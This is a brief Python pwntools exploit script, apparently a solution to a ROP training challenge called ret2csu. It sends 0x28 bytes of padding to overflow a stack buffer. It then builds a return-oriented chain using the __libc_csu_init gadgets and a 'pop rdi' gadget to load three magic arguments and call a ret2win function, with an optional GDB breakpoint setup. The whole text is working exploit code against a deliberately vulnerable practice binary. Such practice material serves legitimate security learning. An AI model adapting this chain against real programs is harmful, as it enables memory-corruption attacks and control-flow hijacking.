from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x40069a
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


param1 = 0xdeadbeefdeadbeef
param2 = 0xcafebabecafebabe
param3 = 0xd00df00dd00df00d

p = start()
r.raw(b'A'*0x28)
r.ret2csu(edi=0x0, rsi=param2, rdx=param3)
r.raw(p64(r.find_gadget(['pop rdi', 'ret'])[0]))
r.raw(p64(param1))
r.call(e.sym['ret2win'])
log.info("ret2csu chain:\n %s" % r.dump())
p.recvuntil(b'>')
p.sendline(bytes(r))

p.interactive()
